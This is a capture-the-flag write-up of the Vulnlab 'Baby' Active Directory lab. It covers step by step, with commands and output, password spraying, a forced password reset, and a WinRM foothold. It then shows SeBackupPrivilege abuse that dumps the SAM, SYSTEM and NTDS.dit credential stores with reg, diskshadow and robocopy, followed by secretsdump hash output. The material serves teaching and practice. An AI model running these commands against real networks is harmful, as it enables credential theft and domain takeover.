---
title: VL Baby
published: 2025-10-24
description: Baby is a Windows Active Directory Easy Box from Vulnlab, we will learn Abusing STATUS_PASSWORD_MUST_CHANGE | Abusing SeBackupPrivilege | Dumping hashes using backup | Dumping Hashes...
image: 'https://assets.vulnlab.com/baby_slide.png'
tags: [Active Directory, Easy, Vulnlab,]
category: Writeup
draft: false
---


# Baby

## Reconnaissance

As always, we start off by performing our regular `TCP` scan using `nmap` &#x20;

```bash
nmap --privileged -p- --open -Pn -n --min-rate 5000 -sS -sCV -vvv -oN scan 10.129.8.92
```

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-24 07:15:55Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52764/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
52765/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52774/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55156/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see we are facing a *DC* (Domain Controller) because of the open ports like `53 TCP (DNS)` `88 TCP (Kerberos)` `389 TCP (LDAP)`&#x20;

We can already see the domain using `netexec` so we can add it to our `/etc/hosts` file

```bash
netexec smb $TARGET
SMB         10.129.50.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
```

Let's start off by enumerating *DNS* using `dig`&#x20;

```bash
dig @$TARGET baby.vl NS
baby.vl.		3600	IN	NS	babydc.baby.vl.
```

We can see also the *fully qualified domain* name of the `DC`&#x20;

Now let's enumerate `SMB` on the target machine using a *NULL Session* in `netexec` &#x20;

```bash
netexec smb babydc.baby.vl -u '' -p '' --users --shares --rid-brute
SMB         10.129.50.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.129.50.21    445    BABYDC           [+] baby.vl\: 
SMB         10.129.50.21    445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED
SMB         10.129.50.21    445    BABYDC           [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

We see here that our access is blocked using in `SMB`, let's  try `LDAP` using `netexec` again

```bash
 netexec ldap babydc.baby.vl -u '' -p '' --users
LDAP        10.129.50.21    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.50.21    389    BABYDC           [+] baby.vl\: 
LDAP        10.129.50.21    389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.129.50.21    389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                              
LDAP        10.129.50.21    389    BABYDC           Guest                         <never>             2        Built-in account for guest access to the computer/domain
LDAP        10.129.50.21    389    BABYDC           Jacqueline.Barnett            2021-11-21 15:11:03 2                                                   
LDAP        10.129.50.21    389    BABYDC           Ashley.Webb                   2021-11-21 15:11:03 2                                                   
LDAP        10.129.50.21    389    BABYDC           Hugh.George                   2021-11-21 15:11:03 2                                                   
LDAP        10.129.50.21    389    BABYDC           Leonard.Dyer                  2021-11-21 15:11:03 2                                                   
LDAP        10.129.50.21    389    BABYDC           Connor.Wilkinson              2021-11-21 15:11:08 2                                                   
LDAP        10.129.50.21    389    BABYDC           Joseph.Hughes                 2021-11-21 15:11:08 2                                                   
LDAP        10.129.50.21    389    BABYDC           Kerry.Wilson                  2021-11-21 15:11:08 2                                                   
LDAP        10.129.50.21    389    BABYDC           Teresa.Bell                   2021-11-21 15:14:37 2        Set initial password to BabyStart123!      
LDAP        10.129.50.21    389    BABYDC           Caroline.Robinson             2021-11-21 15:14:37 2             
  ~/HackTheBox/Medium/Baby/nmap ❯ 
```

We successfully enumerated some users on the DC and a potential credential `Teresa.Bell:BabyStart123!`&#x20;

## Password Spraying

As we found a bunch of users and password it is only natural to perform a *password spraying attack* on every user we found, let's use `netexec` again in order to do this, this time  we will target the *SMB* service

```bash
netexec smb babydc.baby.vl -u ../content/users.txt -p 'BabyStart123!' --users
SMB         10.129.50.21    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.129.50.21    445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.50.21    445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.50.21    445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.50.21    445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.50.21    445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.50.21    445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.50.21    445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.50.21    445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.50.21    445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.50.21    445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE                                                                                                                    4s
```

And we see a different status on the `Caroline.Robinson` account: `STATUS_PASSWORD_MUST_CHANGE`&#x20;

We can abuse this using `smbpasswd` , changing the targeted users password to a new password that we decide, in this case we will use `BabyStarted123!` for example:

```bash
smbpasswd -U Caroline.Robinson -r $TARGET
Old SMB password: BabyStart123!
New SMB password: BabyStarted123!
Retype new SMB password: BabyStarted123!
```

Now we can check if this user has got any remote connection privilege, we will check `winrm` which is active on `TCP 5985`&#x20;

```
metexec winrm babydc.baby.vl -u 'Caroline.Robinson' -p 'BabyStarted123!'
WINRM       10.129.50.21    5985   BABYDC           [+] baby.vl\Caroline.Robinson:BabyStarted123! (Pwn3d!)
```

Success! now we can foothold onto the machine

## Foothold

Let's use the `evil-winrm` tool in order to get our foothold on the *DC* &#x20;

```bash
evil-winrm -i $TARGET -u 'Caroline.Robinson' -p 'BabyStarted123!';
```

Before using `BloodHound` to escalate our privileges, let's try to do some basic enumeration to see our current user's privileges

```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

And we got a dangerous privilege!: `SeBackupPrivilege` we can perform a copy of the `SAM`, `SYSTEM` & `NTDS` which are sensitive databases that contain juicy hashes

## Abusing SeBackupPrivilege

First, let's copy the `SAM` & `SYSTEM` onto our `C:\Temp` folder using `reg`. These registry hives contain:

* `SAM hive`: Local Security Account Manager database with local user hashes
* `SYSTEM hive`: System boot key needed to decrypt the SAM database

```powershell
*Evil-WinRM* PS C:\Temp> reg save HKLM\SAM C:\Temp\sam.hive
The operation completed successfully.
*Evil-WinRM* PS C:\Temp> reg save HKLM\SYSTEM C:\Temp\system.hive
The operation completed successfully.
*Evil-WinRM* PS C:\Temp> dir
    Directory: C:\Temp
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/24/2025   9:01 AM          49152 sam.hive
-a----        10/24/2025   9:01 AM       20684800 system.hive
```

Now for the `NTDS.dit` - this is the Active Directory database file that contains all domain user hashes, but it's constantly locked by the `LSASS` process. We need to use *Volume Shadow Copy* Service `(VSS)` to create a snapshot while the file is in use.

First let's create a script on our attacker machine which we can further *interpretate* with `diskshadow` to make the backup of the `NTDS`&#x20;

Save this into a `script.txt` file

```csharp
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

**What this script does:**

* Creates a shadow copy (snapshot) of the `C:` drive
* Exposes it as `E:` drive temporarily
* Uses backup context to bypass file locks

Then upload it to the `DC`&#x20;

```csharp
upload script.txt
Info: Uploading /home/delorian/HackTheBox/Medium/Baby/content/script.txt to C:\Temp\script.txt    
Data: 232 bytes of 232 bytes copied
Info: Upload successful!
```

**Why this works with `SeBackupPrivilege`:**

* Shadow copies allow reading locked files
* Backup flag in `robocopy` uses `SeBackupPrivilege` to bypass `ACLs`
* We get a clean copy of `NTDS.dit` without stopping AD service

```powershell
diskshadow /s script.txt
```

Then let's use `robocopy` to copy the file into our `C:\Temp` folder

```bash
robocopy /b E:\Windows\ntds . ntds.dit
```

And there we have our three files that we will use to dump hashes!!:

```
*Evil-WinRM* PS C:\Temp> dir
    Directory: C:\Temp
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/24/2025   8:20 AM       16777216 ntds.dit
-a----        10/24/2025   9:01 AM          49152 sam.hive
-a----        10/24/2025   9:05 AM            175 script.txt
-a----        10/24/2025   9:01 AM       20684800 system.hive
```

## Dumping hashes

Let's download the three files onto the attacker machine using `evil-winrm's` *download* so we can use `impacket-secretsdump` and dump all the *hashes*&#x20;

```
impacket-secretsdump -sam sam.hive -system system.hive -ntds ntds.dit LOCAL | grep Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:x:::
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
```

We know the second one it's the correct domain *Administrator* user so we will use the hash and `PtH` using `evil-winrm` to the *DC*, this time with the *Administrator* user

<figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F421uXpT20xsG0ZCvntXv%2Fimage.png?alt=media&#x26;token=f3048525-232b-4947-b969-3072a6608df7" alt=""><figcaption></figcaption></figure>

### Conclusion

This attack chain demonstrates a classic Active Directory privilege escalation:

1. **Initial Access**: Password spray → Password reset → `WinRM` access
2. **Privilege Discovery**: Backup Operators group membership with `SeBackupPrivilege`
3. **Credential Extraction**: Shadow copy technique to dump `NTDS.dit`
4. **Domain Compromise**: Extract domain Administrator's *hash* for full domain control

The takeaway is that **Backup Operators** group membership is highly dangerous in *Active Directory environments*, as it allows attackers to extract the entire domain credential database through volume shadow copies, ultimately leading to complete domain compromise.
